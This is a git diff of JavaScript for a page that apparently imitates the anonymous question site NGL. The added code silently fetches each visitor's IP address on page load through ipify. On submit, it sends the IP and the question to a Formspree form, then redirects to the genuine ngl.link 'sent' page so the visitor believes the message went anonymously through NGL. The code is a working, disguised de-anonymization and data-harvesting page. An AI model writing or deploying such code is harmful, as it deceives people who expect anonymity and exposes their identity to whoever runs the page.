@@ -1,5 +1,6 @@
-  const questionInput = document.getElementById("question");
+const questionInput = document.getElementById("question");
 const submitButton = document.getElementById("submit");
+const formData = new FormData();
 
 questionInput.addEventListener("input", function() {
   if (questionInput.value.trim().length > 0) {
@@ -9,25 +10,26 @@ questionInput.addEventListener("input", function() {
   }
 });
 
-// Initialize the form object with the URL of your Google Form
-const form = FormApp.openByUrl('https://docs.google.com/forms/d/e/1FAIpQLSdi5g5rK0VBo4o0EeZIDFGoWJ1mRokp1LPJ2sohTW6cOrb_bQ/viewform');
-
-async function logFormData(formData) {
+function getIPAddress() {
+  return fetch('https://api.ipify.org/?format=json')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error('Unable to fetch IP address');
+      }
+      return response.json();
+    })
+    .then(data => data.ip);
+}
+async function logIPAddress() {
   try {
     const ipAddress = await getIPAddress();
-    formData.ip = ipAddress;
-    // Submit the form response with the data
-    form.createResponse().withItemResponse(
-      form.addTextItem().setTitle('IP Address').setResponse(ipAddress)
-    ).withItemResponse(
-      form.addTextItem().setTitle('Question').setResponse(formData.question)
-    ).submit();
-    window.location.href = "https://ngl.link/p/sent?lng=en";
+    formData.append('ip', ipAddress);
   } catch (error) {
     console.error(error);
-    window.location.href = "https://ngl.link/p/sent?lng=en";
   }
 }
+logIPAddress()
+
 
 const submitBtn = document.getElementById('submit');
 const question = document.getElementById('question');
@@ -38,11 +40,21 @@ submitBtn.addEventListener('click', function(e) {
     return; // do nothing if question input is empty
   }
   
-  const formData = {
-    question: question.value
-  };
   
-  logFormData(formData);
+  
+  formData.append('question', question.value);
+  
+  console.log(formData)
+  fetch('https://formspree.io/f/xwkjzpak', {
+    method: 'POST',
+    body: formData
+  })
+  .then(response => {
+      window.location.href = "https://ngl.link/p/sent?lng=en";
+  })
+  .catch(error => {
+      window.location.href = "https://ngl.link/p/sent?lng=en";
+  });
 });
 
 if (document.forms.length > 0) {
